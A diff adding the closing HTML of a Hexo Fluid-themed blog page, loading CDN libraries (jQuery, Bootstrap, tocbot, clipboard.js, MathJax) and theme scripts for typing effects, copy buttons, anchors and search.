+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        MathJax = {
+          tex    : {
+            inlineMath: { '[+]': [['$', '$']] }
+          },
+          loader : {
+            load: ['ui/lazy']
+          },
+          options: {
+            renderActions: {
+              findScript    : [10, doc => {
+                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                  const display = !!node.type.match(/; *mode=display/);
+                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                  const text = document.createTextNode('');
+                  node.parentNode.replaceChild(text, node);
+                  math.start = { node: text, delim: '', n: 0 };
+                  math.end = { node: text, delim: '', n: 0 };
+                  doc.math.push(math);
+                });
+              }, '', false],
+              insertedScript: [200, () => {
+                document.querySelectorAll('mjx-container').forEach(node => {
+                  let target = node.parentNode;
+                  if (target.nodeName.toLowerCase() === 'li') {
+                    target.parentNode.classList.add('has-jax');
+                  }
+                });
+              }, '', false]
+            }
+          }
+        };
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
